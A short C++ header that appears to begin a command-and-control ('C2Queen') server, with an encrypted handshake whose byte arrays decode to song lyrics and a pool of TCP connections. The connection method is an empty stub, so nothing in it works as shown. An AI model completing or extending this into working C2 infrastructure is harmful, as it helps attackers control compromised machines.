#include "../net/conn.h"
#include "../crypto/ciphers/vox.h"

namespace queen {

	data::Bytes defaultCall = {
		0x4B, 0x69, 0x6E, 0x67, 0x73, 0x6C, 0x61, 0x79, 
		0x65, 0x72, 0x2C, 0x20, 0x64, 0x65, 0x73, 0x74, 
		0x72, 0x6F, 0x79, 0x69, 0x6E, 0x67, 0x20, 0x63,
		0x61, 0x73, 0x74, 0x6C, 0x65, 0x73, 0x20, 0x69,
		0x6E, 0x20, 0x74, 0x68, 0x65, 0x20, 0x73, 0x6B,
		0x79, 0x21, 0x20, 0x4B, 0x69, 0x6E, 0x67, 0x73,
		0x6C, 0x61, 0x79, 0x65, 0x72, 0x2C, 0x20, 0x49,
		0x27, 0x64, 0x20, 0x73, 0x61, 0x63, 0x72, 0x69,
		0x66, 0x69, 0x63, 0x65, 0x20, 0x69, 0x74, 0x20, 
		0x61, 0x6C, 0x6C, 0x20, 0x74, 0x6F, 0x20, 0x66,
		0x69, 0x6E, 0x64, 0x20, 0x79, 0x6F, 0x75, 0x2C, 
		0x20, 0x6E, 0x65, 0x76, 0x65, 0x72, 0x20, 0x68,
		0x61, 0x76, 0x65, 0x20, 0x74, 0x6F, 0x20, 0x62,
		0x61, 0x74, 0x74, 0x6C, 0x65, 0x20, 0x61, 0x6C,
		0x6F, 0x6E, 0x65, 0x21, 0x20, 0x28, 0x4F, 0x48,
		0x20, 0x59, 0x45, 0x41, 0x48, 0x21, 0x29, 0x20
	};

	data::Bytes defaultResponse = {
		0x4C, 0x69, 0x66, 0x65, 0x20, 0x69, 0x73, 0x20,
		0x65, 0x6E, 0x63, 0x72, 0x79, 0x70, 0x74, 0x65,
		0x64, 0x2C, 0x20, 0x79, 0x6F, 0x75, 0x27, 0x72,
		0x65, 0x20, 0x6D, 0x6F, 0x64, 0x69, 0x66, 0x69,
		0x65, 0x64, 0x2C, 0x20, 0x6C, 0x69, 0x6B, 0x65,
		0x20, 0x61, 0x20, 0x76, 0x69, 0x72, 0x75, 0x73,
		0x20, 0x69, 0x6E, 0x20, 0x61, 0x20, 0x6C, 0x75, 
		0x6C, 0x6C, 0x61, 0x62, 0x79, 0x21, 0x20, 0x41,
		0x72, 0x74, 0x69, 0x66, 0x69, 0x63, 0x69, 0x61,
		0x6C, 0x20, 0x74, 0x69, 0x6C, 0x6C, 0x20, 0x74,
		0x68, 0x65, 0x20, 0x64, 0x61, 0x79, 0x20, 0x79,
		0x6F, 0x75, 0x20, 0x64, 0x69, 0x65, 0x2C, 0x20,
		0x73, 0x69, 0x6C, 0x6C, 0x79, 0x20, 0x70, 0x72,
		0x6F, 0x67, 0x72, 0x61, 0x6D, 0x2C, 0x20, 0x79,
		0x6F, 0x75, 0x27, 0x72, 0x65, 0x20, 0x63, 0x6F,
		0x72, 0x72, 0x75, 0x70, 0x74, 0x65, 0x64, 0x21
	};

	class C2Queen {

		private:

			key::Key voxKey;
			vox::VOX cipher;
			data::Bytes c;
			data::Bytes r;

			sda::SDA<conn::TCPConnection> connections;

		public:

			C2Queen(key::Key encryptionKey, data::Bytes call = defaultCall, data::Bytes response = defaultResponse, int n = 1000) {
				voxKey = encryptionKey;
				c = call;
				r = response;
				connections = sda::SDA<conn::TCPConnection>(n);
			}

			bool establishConnection(string ip, int port) {
				
			}

	};

};
